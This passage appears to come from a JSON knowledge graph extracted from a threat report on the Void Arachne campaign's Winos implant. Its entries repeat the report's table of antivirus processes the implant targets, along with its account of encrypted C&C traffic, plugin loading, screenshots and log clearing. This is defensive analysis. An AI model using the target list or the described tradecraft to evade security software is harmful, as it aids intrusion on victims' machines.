          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "kxescore.exe",
      "type": "Tool",
      "id": "tool--kxescore-exe",
      "description": "金山核心进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "kscan.exe",
      "type": "Tool",
      "id": "tool--kscan-exe",
      "description": "金山扫描进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "360Safe.exe",
      "type": "Tool",
      "id": "tool--360safe-exe",
      "description": "360 Total Security进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "360sd.exe",
      "type": "Tool",
      "id": "tool--360sd-exe",
      "description": "360杀毒进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "360 Total Security",
      "type": "Tool",
      "id": "tool--360-total-security",
      "description": "杀毒软件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "kwsprotect64.exe",
      "type": "Tool",
      "id": "tool--kwsprotect64-exe",
      "description": "金山保护进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Kxetray.exe",
      "type": "Tool",
      "id": "tool--kxetray-exe",
      "description": "金山托盘进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "360Tray.exe",
      "type": "Tool",
      "id": "tool--360tray-exe",
      "description": "360 Total Security托盘进程",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Data Encryption",
      "type": "Technique",
      "id": "technique--data-encryption",
      "description": "使用加密算法加密收集的数据",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "C&C Communication",
      "type": "Procedure",
      "id": "procedure--c2-communication",
      "description": "与C&C服务器通信并执行命令",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Encryption Key Generation",
      "type": "Procedure",
      "id": "procedure--encryption-key-generation",
      "description": "通过timeGetTime()生成加密密钥",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Command Execution",
      "type": "Technique",
      "id": "technique--command-execution",
      "description": "执行加载插件、截图、清除日志等任务",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "LoginModule.dll",
      "type": "Tool",
      "id": "tool--loginmodule-dll",
      "description": "恶意软件主植入物",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
